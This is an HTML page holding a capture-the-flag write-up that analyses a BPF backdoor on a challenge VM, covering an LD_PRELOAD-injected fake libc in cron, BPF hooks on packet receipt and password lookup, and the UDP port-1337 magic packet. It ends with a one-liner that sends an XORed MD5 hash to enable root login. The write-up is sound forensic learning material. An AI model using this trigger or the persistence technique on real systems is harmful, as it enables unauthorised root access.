@@ -1,0 +1,179 @@
+<!doctype html><html lang=en-us>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta itemprop=name content="Egghunt">
+<meta itemprop=description content="Challenge Description:  After moving laterally, PROTECTIVE PENGUIN compromised a number of additional systems and gained persistence. We have identified another host in the DMZ that we believe was backdoored by the adversary and is used to regain access.
+  Please download a virtual machine image of that host and identify the backdoor. Validate your findings in our test environment on egghunt.challenges.adversary.zone.
+ Write-Up: This was hands-down my favorite challenge."><meta itemprop=datePublished content="2021-02-04T19:50:09-06:00">
+<meta itemprop=dateModified content="2021-02-04T19:50:09-06:00">
+<meta itemprop=wordCount content="1305">
+<meta itemprop=keywords content="AdversaryQuest,CTFs,"><meta property="og:title" content="Egghunt">
+<meta property="og:description" content="Challenge Description:  After moving laterally, PROTECTIVE PENGUIN compromised a number of additional systems and gained persistence. We have identified another host in the DMZ that we believe was backdoored by the adversary and is used to regain access.
+  Please download a virtual machine image of that host and identify the backdoor. Validate your findings in our test environment on egghunt.challenges.adversary.zone.
+ Write-Up: This was hands-down my favorite challenge.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://lothan.github.io/ctfs/2021-adversary-quest/egghunt/"><meta property="article:section" content="ctfs">
+<meta property="article:published_time" content="2021-02-04T19:50:09-06:00">
+<meta property="article:modified_time" content="2021-02-04T19:50:09-06:00">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Egghunt">
+<meta name=twitter:description content="Challenge Description:  After moving laterally, PROTECTIVE PENGUIN compromised a number of additional systems and gained persistence. We have identified another host in the DMZ that we believe was backdoored by the adversary and is used to regain access.
+  Please download a virtual machine image of that host and identify the backdoor. Validate your findings in our test environment on egghunt.challenges.adversary.zone.
+ Write-Up: This was hands-down my favorite challenge.">
+<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
+<link rel=manifest href=/site.webmanifest>
+<link rel=mask-icon href=/safari-pinned-tab.svg color>
+<link rel="shortcut icon" href=/favicon.ico>
+<title>Egghunt</title>
+<link rel=stylesheet href=https://lothan.github.io/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin=anonymous>
+</head>
+<body id=page>
+<header id=site-header class="animated slideInUp">
+<div class="hdr-wrapper section-inner">
+<div class=hdr-left>
+<div class=site-branding>
+<a href=https://lothan.github.io/>Joe Lothan</a>
+</div>
+<nav class="site-nav hide-in-mobile">
+<a href=https://lothan.github.io/ctfs/>CTFs</a>
+</nav>
+</div>
+<div class="hdr-right hdr-icons">
+<span class="hdr-social hide-in-mobile"><a href=https://github.com/lothan target=_blank rel="noopener me" title=Github><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button>
+</div>
+</div>
+</header>
+<div id=mobile-menu class="animated fast">
+<ul>
+<li><a href=https://lothan.github.io/ctfs/>CTFs</a></li>
+</ul>
+</div>
+<main class="site-main section-inner thin animated fadeIn faster">
+<h1>Egghunt</h1>
+<div class=content>
+<h4 id=challenge-description>Challenge Description:<a href=#challenge-description class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h4>
+<blockquote>
+<p>After moving laterally, PROTECTIVE PENGUIN compromised a number of additional systems and gained persistence. We have identified another host in the DMZ that we believe was backdoored by the adversary and is used to regain access.</p>
+</blockquote>
+<blockquote>
+<p>Please download a virtual machine image of that host and identify the backdoor. Validate your findings in our test environment on egghunt.challenges.adversary.zone.</p>
+</blockquote>
+<h4 id=write-up>Write-Up:<a href=#write-up class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h4>
+<p>This was hands-down my favorite challenge. I knew nothing about BPF before starting and I learned a lot. For this challenge, we have to find a backdoor on a linux host and reverse engineer it.</p>
+<p>We&rsquo;re given a <code>.qcow2</code> QEMU virtual machine image with a shell script <code>run.sh</code> that runs the image. <code>run.sh</code> forwards the TCP port 4422 for ssh access and the UDP port 1337, presumably for the backdoor. But when we login and look for listening ports on the machine, strangely, UDP port 1337 is not listed:</p>
+<pre tabindex=0><code>root@egghunt:~# netstat -tulnp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:4422            0.0.0.0:*               LISTEN      379/sshd: /usr/sbin 
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      365/systemd-resolve 
+tcp6       0      0 :::4422                 :::*                    LISTEN      379/sshd: /usr/sbin 
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           365/systemd-resolve 
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           587/dhclient
+</code></pre><p>I looked around a bit with <code>ls -la</code> to see if there was anything suspicious or out of place. Almost immediately I came across a very suspsicious file in <code>/dev/shm</code>. <code>shm</code> stands for shared memory - all files in <code>/dev/shm</code> are stored in memory and thus erased across reboots so it is usually empty:</p>
+<pre tabindex=0><code>root@egghunt:~# ls /dev/shm/
+x86_64-linux-gnu
+root@egghunt:~# ls /dev/shm/x86_64-linux-gnu/
+libc.so.7
+</code></pre><p>Very suspicious, a libc shared object file not in <code>/lib</code>. I wonder what program is using this (probably) malicious <code>libc.so.7</code>? We can use <code>ldd</code> to search for binaries that are linked to this file:</p>
+<pre tabindex=0><code>root@egghunt:~# ldd /bin/* /usr/bin/* /sbin/* /usr/sbin/* 2&gt;/dev/null | grep &quot;libc.so.7&quot;
+root@egghunt:~# 
+</code></pre><p>But I guess it makes sense there are none - <code>/dev/shm</code> is ephemeral and recompiling/relinking a binary pointing to a temporary location wouldn&rsquo;t make much sense. It makes more sense to use an environment variable like <code>LD_LIBRARY_PATH</code> upon running a binary to inject a shared object. So let&rsquo;s check <code>/proc</code> to see which running processes might specify this malicious <code>libc</code> in an environment variable.</p>
+<pre tabindex=0><code>root@egghunt:~# grep &quot;libc.so.7&quot; /proc/*/environ 
+Binary file /proc/974/environ matches
+root@egghunt:~# cat /proc/974/comm 
+cron
+root@egghunt:~# cat /proc/974/environ 
+LD_PRELOAD=/dev/shm/x86_64-linux-gnu/libc.so.7SHELL=/bin/bashPWD=/root...
+</code></pre><p>So it looks like <code>cron</code> has a malicious libc injected using <code>LD_PRELOAD</code>. Taking a look at this <code>libc.so.7</code> and we find something very interesting right at the beginning of one of the <code>entry.init</code> functions:</p>
+<p><img src=images/penguin-egg-entry.png alt="entry function unsets LD_PRELOAD and looks for DBG environment variable"></p>
+<p>As soon as its loaded, our malicious <code>libc.so.7</code> unsets the environment variables <code>LD_PRELOAD</code> and searches for the environment variable <code>__DBG__</code>. I bet DBG stands for debug - lets rerun <code>cron</code> but with <code>__DBG__</code> set and see what happens.</p>
+<pre tabindex=0><code>root@egghunt:~# kill 974
+root@egghunt:~# LD_PRELOAD=/dev/shm/x86_64-linux-gnu/libc.so.7 __DBG__= cron
+libbpf: loading object 'implant_bpf' from buffer
+libbpf: elf: section(2) tracepoint/net/netif_receive_skb, size 2344, link 0, flags 6, type=1
+libbpf: sec 'tracepoint/net/netif_receive_skb': found program 'kprobe_netif_receive_skb' at insn offset 0 (0 bytes), code size 293 insns (2344 bytes)
+libbpf: elf: section(3) uprobe/getspnam_r_entry, size 336, link 0, flags 6, type=1
+libbpf: sec 'uprobe/getspnam_r_entry': found program 'getspnam_r_entry' at insn offset 0 (0 bytes), code size 42 insns (336 bytes)
+libbpf: elf: section(4) uprobe/getspnam_r_exit, size 312, link 0, flags 6, type=1
+libbpf: sec 'uprobe/getspnam_r_exit': found program 'getspnam_r_exit' at insn offset 0 (0 bytes), code size 39 insns (312 bytes)
+libbpf: elf: section(5) license, size 4, link 0, flags 3, type=1
+libbpf: license of implant_bpf is GPL
+...
+</code></pre><p>Looks like out backdoor implant is liscensed under the GPL</p>
+<p><img src=images/thumbs-up.gif alt="thumbs up gif"></p>
+<p>Reading the debug output, it looks like our implant uses Berkley Packet Filter (BPF). <a href=https://en.wikipedia.org/wiki/Berkeley_Packet_Filter>Wikipedia</a> defines it rather blandly as a tool to analyze network traffic, but coming from <a href=http://www.brendangregg.com/blog/2019-12-02/bpf-a-new-type-of-software.html>Brendan Gregg</a>, who wrote the book on BPF,</p>
+<blockquote>
+<p>BPF programs &mldr; are not processes or kernel modules, and don&rsquo;t appear in traditional observability tools. They are a new type of software, and make a fundamental change to a 50-year old kernel model by introducing a new interface for applications to make kernel requests, alongside syscalls.</p>
+</blockquote>
+<blockquote>
+<p>BPF originally stood for Berkeley Packet Filter, but has been extended in Linux to become a generic kernel execution engine, capable of running a new type of user-defined and kernel-mode applications.</p>
+</blockquote>
+<p>So it makes sense that we wouldn&rsquo;t find any program listening on port 1337 - our backdoor is a BPF program which doesn&rsquo;t show up on &ldquo;traditional observability tools&rdquo;. We have to learn how to speak BPF.</p>
+<p>The most useful tool to interact with BPF programs is, appropriately, <code>bpftool</code>. Listing installed BPF programs:</p>
+<pre tabindex=0><code>root@egghunt:~# bpftool prog list
+3: cgroup_skb  tag 6deef7357e7b4530  gpl
+
+...
+
+16: tracepoint  name kprobe_netif_re  tag e0d014d973f44213  gpl
+	loaded_at 2021-01-14T12:15:17+0000  uid 0
+	xlated 2344B  jited 1544B  memlock 4096B  map_ids 4
+	btf_id 5
+17: kprobe  name getspnam_r_entr  tag acab388c8f8ef0f9  gpl
+	loaded_at 2021-01-14T12:15:17+0000  uid 0
+	xlated 336B  jited 223B  memlock 4096B  map_ids 3
+	btf_id 5
+18: kprobe  name getspnam_r_exit  tag ceeabb4ac5b9ed45  gpl
+	loaded_at 2021-01-14T12:15:17+0000  uid 0
+	xlated 328B  jited 209B  memlock 4096B  map_ids 3,4
+	btf_id 5
+</code></pre><p>The malicious <code>libc.so.7</code> installs three BPF programs: <code>kprobe_netif_receive_skb</code>, <code>getspnam_r_entry</code>, <code>getspnam_r_exit</code>. Judging by the names of these programs, one runs at <a href="https://www.kernel.org/doc/html/latest/networking/kapi.html?highlight=netif#c.netif_receive_skb">netif_receive_skb</a>, the &ldquo;main receieve data processing function&rdquo; for linux networking. The other two run at the beginning and end of each call to <a href=https://man7.org/linux/man-pages/man3/getspent.3.html>getspnam_r</a>, a function to check the <code>/etc/shadow</code> file for linux password hashes.</p>
+<p>BPF programs share data using maps. Above, we can see our <code>kprobe_netif_re</code> BPF program uses map id 4, <code>getspnam_r_entr</code> uses map id 3, and <code>getspnam_r_exit</code> uses map id 3 and 4. We can inspect these maps using <code>bpftool</code>:</p>
+<pre tabindex=0><code>root@egghunt:~# bpftool map list 
+3: hash  name args  flags 0x0
+	key 8B  value 8B  max_entries 10  memlock 4096B
+	btf_id 5
+4: array  name implant_.bss  flags 0x400
+	key 4B  value 36B  max_entries 1  memlock 8192B
+	btf_id 5
+root@egghunt:~# bpftool map dump id 3 
+[]
+root@egghunt:~# bpftool map dump id 4 
+[{
+        &quot;value&quot;: {
+            &quot;.bss&quot;: [{
+                    &quot;backdoor&quot;: {
+                        &quot;enabled&quot;: false,
+                        &quot;hash&quot;: &quot;&quot;
+                    }
+                }
+            ]
+        }
+    }
+]
+</code></pre><p>So presumably the <code>netif_receive_skb</code> program checks for a specific network packet that may contain a password hash and stores it in the &ldquo;backdoor&rdquo; map. And the <code>getspnam</code> program interupts normal logins and uses this password hash instead.</p>
+<p>Lets take a look at the <code>kprobe_netif_re</code> to see what packet we need to send to enable the backdoor. We can dump the BPF program using <code>bpftool prog dump</code> and even better, it has support for outputing a dot file graph to get a visual of the programs flow control. <a href=images/penguin-egg-dot.png>Here</a> is the full program&rsquo;s graph. The instruction set is a bit strange but <a href=https://docs.cilium.io/en/latest/bpf/>this documentation</a> was a great help.</p>
+<p><code>netif_receive_skb</code> is passed the raw packet data as an sk_buff, the common data structure for all linux networking. I spent way too long trying to understand the first few dozen instructions and the structure of sk_buffs but got almost nowhere. The breakthrough came by cheating a bit, and looking for where the program filters for UDP packets on port 1337:</p>
+<p><img src=images/penguin-egg-udp-header.png alt="bpf code that checks the udp header"></p>
+<p>Do you see it? (74) checks if two bytes are <code>0x3905</code>, which converted to little-endian is 1337. So the above code <a href=https://github.com/iovisor/bpf-docs/blob/master/bpf_helpers.rst>reads</a> the UDP header and checks if the destination port is 1337 and length is 42. So minus the header, our packet should be 34 bytes long.</p>
+<p><img src=images/penguin-egg-hash-code.png alt="bpf code that reads the packet"></p>
+<p>Next we read the 34 bytes of our UDP packet and check that the first three bytes are <code>0x66</code>, <code>0x73</code>, and <code>0x66</code>. Then all following bytes are XORed with 66. If we XOR the first 3 bytes with 66 we get the ASCII <code>$1$</code>, the start of an MD5 hash. So to trigger the backdoor, we have to send a UDP packet with an MD5 sum XORed with 66. Then we can login as root with our password. In an ugly one-liner:</p>
+<pre tabindex=0><code>$ python -c &quot;print(bytes(map(lambda x: x^66, \
+  	 b\&quot;$(openssl passwd -1 pwned)\&quot;)).decode('ascii'), end='')&quot; \
+  	 | nc -u localhost 1337
+</code></pre>
+</div>
+</main>
+<footer id=site-footer class="section-inner thin animated fadeIn faster">
+<p>&copy; 2021 <a href=https://lothan.github.io/>Joe Lothan</a></p>
+<p>
+Made with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> &#183; Theme <a href=https://github.com/Track3/hermit target=_blank rel=noopener>Hermit</a> &#183; <a href=https://lothan.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a>
+</p>
+</footer>
+<script src=https://lothan.github.io/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin=anonymous></script>
+</body>
+</html>
